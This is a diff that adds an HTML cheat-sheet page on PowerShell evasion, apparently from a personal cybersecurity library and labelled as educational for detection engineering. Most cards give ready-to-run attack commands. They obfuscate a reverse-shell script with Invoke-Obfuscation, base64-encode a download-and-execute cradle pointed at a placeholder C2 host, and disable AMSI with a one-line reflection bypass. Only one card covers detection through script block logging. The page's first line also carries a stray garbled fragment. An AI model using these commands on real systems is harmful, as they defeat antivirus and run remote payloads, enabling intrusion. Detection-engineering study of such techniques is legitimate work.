@@ -1,0 +1,48 @@
+phing<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell Obfuscation | TKhoa's Cybersecurity Library</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="page">
+        <header>
+            <h1>PowerShell Evasion Techniques</h1>
+            <p>Obfuscate scripts to bypass AMSI/AV. Educational for detection engineering.</p>
+        </header>
+
+        <section class="card">
+            <h2>Invoke-Obfuscation Install</h2>
+            <pre><code>git clone https://github.com/danielbohannon/Invoke-Obfuscation
+Import-Module ./Invoke-Obfuscation.ps1</code></pre>
+        </section>
+
+        <section class="card">
+            <h2>Basic Obfuscation</h2>
+            <pre><code>Invoke-Obfuscation -ScriptPath reverse.ps1 -ObfuscationMethod TokenKind\All\1</code></pre>
+            <p>Apply token obfuscation layers (variables, strings, commands).</p>
+        </section>
+
+        <section class="card">
+            <h2>String Encoding</h2>
+            <pre><code>$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX (New-Object Net.WebClient).DownloadString(\"http://c2/ payload\")'))
+powershell -enc $enc</code></pre>
+        </section>
+
+        <section class="card">
+            <h2>AMSI Bypass</h2>
+            <pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
+        </section>
+
+        <section class="card">
+            <h2>Execution Detection</h2>
+            <pre><code>Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Where-Object {$_.Id -eq 4104}</code></pre>
+            <p>Script block logging reveals obfuscated code.</p>
+        </section>
+
+        <p class="note"><a href="evasion.html">← Evasion</a></p>
+    </div>
+</body>
+</html>
